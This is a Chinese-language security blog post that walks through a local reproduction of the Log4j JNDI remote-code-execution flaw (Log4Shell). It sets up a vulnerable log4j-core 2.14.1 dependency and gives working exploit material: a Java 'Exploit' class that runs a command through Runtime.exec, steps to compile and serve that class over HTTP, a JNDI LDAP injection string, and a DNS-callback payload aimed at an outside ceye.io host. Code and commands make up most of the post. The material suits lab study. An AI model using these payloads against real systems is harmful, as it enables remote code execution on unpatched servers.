<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">package log4j;</span><br><span class="line"></span><br><span class="line">import java.io.IOException;</span><br><span class="line"></span><br><span class="line">public class Exploit &#123;</span><br><span class="line">    public Exploit()&#123;</span><br><span class="line"></span><br><span class="line">        String commands=&quot;calc.exe&quot;;</span><br><span class="line">        try &#123;</span><br><span class="line">            Process pc = Runtime.getRuntime().exec(commands);</span><br><span class="line">            pc.waitFor();</span><br><span class="line">        &#125; catch (IOException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125; catch (InterruptedException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public static void main(String[] args) &#123;</span><br><span class="line">        Exploit e = new Exploit();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>编译 (或者直接去IDEA编译目录  文件-项目结构-模块-路径-输出目录</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">javac Exploit.java</span><br></pre></td></tr></table></figure>

<p>起一个服务</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">C:\Users\tea90\IdeaProjects\MavenTest\target\classes\log4j</span><br><span class="line">λ python3 -m http.server 8100</span><br><span class="line">Serving HTTP on 0.0.0.0 port 8100 (http://0.0.0.0:8100/) ...</span><br><span class="line">127.0.0.1 - - [01/Mar/2023 18:02:59] &quot;GET / HTTP/1.1&quot; 200 -</span><br><span class="line">127.0.0.1 - - [01/Mar/2023 18:02:59] code 404, message File not found</span><br><span class="line">127.0.0.1 - - [01/Mar/2023 18:02:59] &quot;GET /favicon.ico HTTP/1.1&quot; 404 -</span><br></pre></td></tr></table></figure>

<p>payload</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$&#123;jndi:ldap://localhost:8888/Exploit&#125;</span><br></pre></td></tr></table></figure>

<p>以上攻击类搞好了！</p>
<hr>
<p>Log4j受害服务搞一下</p>
<p>pom.xml 添加log4j依赖</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;dependency&gt;</span><br><span class="line">    &lt;groupId&gt;org.apache.logging.log4j&lt;/groupId&gt;</span><br><span class="line">    &lt;artifactId&gt;log4j-core&lt;/artifactId&gt;</span><br><span class="line">    &lt;version&gt;2.14.1&lt;/version&gt;</span><br><span class="line">&lt;/dependency&gt;</span><br></pre></td></tr></table></figure>

<p>在重新执行下pom文件</p>
<p>需要jdk1.8</p>
<p>dns payload</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$&#123;jndi:ldap://12345.p7yc0x.ceye.io:1389/aaa&#125;</span><br></pre></td></tr></table></figure>




<h2 id="Links"><a href="#Links" class="headerlink" title="Links"></a>Links</h2><p><a target="_blank" rel="noopener" href="https://mp.weixin.qq.com/s/LifR0gbTcERU4Uvicc4LOw">https://mp.weixin.qq.com/s/LifR0gbTcERU4Uvicc4LOw</a></p>
<p><a target="_blank" rel="noopener" href="https://zhuanlan.zhihu.com/p/53596025">https://zhuanlan.zhihu.com/p/53596025</a></p>
<p><a target="_blank" rel="noopener" href="https://xy2401.com/local-docs/oracle/java.zh/tutorial/rmi/running.html">https://xy2401.com/local-docs/oracle/java.zh/tutorial/rmi/running.html</a></p>

        </div>

        
            <section class="post-copyright">
                
                    <p class="copyright-item">
                        <span>Author:</span>
                        <span>tea9</span>
                    </p>
                
                
                    <p class="copyright-item">
                        <span>Permalink:</span>
                        <span><a href="http://tea9.xyz/post/2725260304.html">http://tea9.xyz/post/2725260304.html</a></span>
                    </p>
                
                
                    <p class="copyright-item">
                        <span>License:</span>
                        <span>Copyright (c) 2017-2022 <a target="_blank" rel="noopener" href="http://creativecommons.org/licenses/by-nc/4.0/">CC-BY-NC-4.0</a> LICENSE</span>
                    </p>
                
                
                     <p class="copyright-item">
                         <span>Slogan:</span>
                         <span>Do you believe in <strong>DESTINY</strong>?</span>
                     </p>
                

            </section>
        
        <section class="post-tags">
            <div>
                <span>Tag(s):</span>
                <span class="tag">
                    
                    
                        <a href="/tags/web%E5%AE%89%E5%85%A8/"># web安全</a>
                    
                        
                </span>
            </div>
            <div>
                <a href="javascript:window.history.back();">back</a>
                <span>· </span>
                <a href="/">home</a>
            </div>
        </section>
        <section class="post-nav">
            
                <a class="prev" rel="prev" href="/post/529587777.html">软件供应链安全简析</a>
            
            
            <a class="next" rel="next" href="/post/3845865535.html">安全建设</a>
            
        </section>
    </article>
</div>




            </div>
            <footer id="footer" class="footer">
 
    <div class="copyright">
        <span>© tea9 | Powered by <a href="https://hexo.io" target="_blank">Hexo</a> & <a href="https://github.com/Siricee/hexo-theme-Chic" target="_blank">Chic</a></span>
    </div>
   
</footer>

    </div>
<script src="/live2dw/lib/L2Dwidget.min.js?094cbace49a39548bed64abff5988b05"></script><script>L2Dwidget.init({"pluginRootPath":"live2dw/","pluginJsPath":"lib/","pluginModelPath":"assets/","tagMode":false,"debug":false,"model":{"jsonPath":"live2d-widget-model-hijiki"},"display":{"position":"right","width":200,"height":350},"mobile":{"show":true},"log":false});</script></body>

</html>